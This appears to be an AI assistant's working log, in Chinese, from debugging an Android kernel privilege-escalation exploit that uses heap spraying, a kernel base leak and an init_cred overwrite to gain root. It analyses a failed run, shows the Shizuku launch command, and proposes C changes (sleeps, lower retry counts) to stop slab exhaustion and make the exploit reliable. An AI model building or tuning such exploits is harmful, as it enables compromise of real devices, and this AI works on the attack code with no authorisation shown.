# AI 留档快照 — 2026-07-16 (R3 分析 + R4 sleep 微调)

## R3_test1 发生了什么

### 输出 (5 行, 344 字节)
```
[+] preload starting pid=29821
[+] runtime performance cpu=7 max_freq=3050000 capacity=1024
[+] startup pid=29821 uid=0 attr=u:r:untrusted_app_27:s0:c218,c257,c512,c768 enforce=unreadable direct_cpu=7
[-] kernel page retry 1/12 mode=1
[!] SYSCHK(open(path, O_RDONLY | O_CLOEXEC)): Permission denied
```

### 根因分析
**R3_test1 没有通过 Shizuku 运行！**
- uid=0 但 SELinux context = untrusted_app_27
- untrusted_app_27 被 SELinux 封锁 /proc/PID/mem → Permission denied
- 与 R1_test1 完全相同的错误模式
- 好消息：没有重启！(只跑了 1 次 prepare_kernel_page，没耗尽 slab)

### 正确的运行方式
必须通过 Shizuku 获得 shell 上下文 (uid=2000, SELinux=shell)：
```
RISH_APPLICATION_ID=com.termux /system/bin/app_process -Djava.class.path=/data/local/tmp/rish_shizuku.dex /system/bin --nice-name=rish rikka.shizuku.shell.ShizukuShellLoader
```
然后在 rish shell 里运行 exploit。

## 本次 AI 做了什么
1. 通读全部 7 个核心文档
2. 通读全部源码 (main.c, preload.c, slide.c, fops.c, pipe.c, util.c, common.h, target.h, Makefile)
3. 分析 R3_test1 失败原因 = 未通过 Shizuku 运行
4. 找到 slab 耗尽的根本原因：prepare_good_kernel_page() 重试循环无 sleep

## 🔑 核心发现：sleep 微调的关键位置

### 位置 1: prepare_good_kernel_page() — util.c:585-597 ★★★ 最关键
```c
for (int attempt = 1; attempt <= max_attempts; attempt++) {
    uintptr_t base = prepare_kernel_page(payload_mode);
    if (base) return base;
    pr_warning("kernel page retry %d/%d mode=%d\n", attempt, max_attempts, payload_mode);
    // ← 这里没有任何 sleep！立刻重试！
}
```
每次 prepare_kernel_page() 克隆 ~543 个进程 (272+204+33+34)，做 heap spray，SKB reclaim。
连续 12 次 (SLIDE 模式) 或 72 次 (FOPS 模式) 无间隔重试 → slab 必然耗尽 → 内核 panic → 重启。

**建议修改**: 
- retry 之间加 `sleep(2)` 等待内核 GC
- 或把 SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 从 12 降到 5

### 位置 2: slide_leak_kernel_base() — slide.c:391-443
外层循环 SLIDE_MAX_ATTEMPTS=20，每次调用 prepare_good_kernel_page(SLIDE)。
如果内层 retry 12 次每次都失败，外层又循环 20 次 → 最多 240 次 prepare_kernel_page()！

**建议修改**: 外层重试之间也加 sleep(2)

### 位置 3: PSELECT_ENTER_DELAY_USEC — common.h:92
当前 50000 usec = 50ms。这个值在 slide_consumer 和 main_consumer 中用 usleep() 等待。
可能可以适当增大给内核更多喘息时间。

### 位置 4: pipe.c DIRECT_WRITE_TIMEOUT_SEC
当前 180 秒。Direct write 子进程内部也会调用 prepare_good_kernel_page(SLIDE)。
如果子进程卡在 page prepare，父进程要等 3 分钟才超时。

## 推荐的 R4 改动方案（保守微调）

### 改动 A：prepare_good_kernel_page 加 sleep（util.c）
```c
// 在 pr_warning(...) 之后添加:
if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    sleep(2);  // 给内核时间回收 slab
} else {
    usleep(500000);  // FOPS 模式重试更频繁，用 0.5s
}
```

### 改动 B：降低 SLIDE 最大重试次数（common.h）
```c
#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 5  // 从 12 降到 5
```

### 改动 C：slide 外层循环加冷却（slide.c）
```c
// 在 slide_leak_kernel_base 的 pr_warning 之后加:
sleep(3);  // 外层重试之间给 3 秒冷却
```

## 下一步 (R4)
1. 应用上述 sleep 改动
2. make clean && make → sha256sum 验证变化
3. cp 为 preload_mtk_R4.so
4. **通过 Shizuku 部署和运行**（关键！）
5. 手机刚重启 → 只跑一次
6. 预期输出: `direct mode=init_cred` → `direct-root-summary root=1`
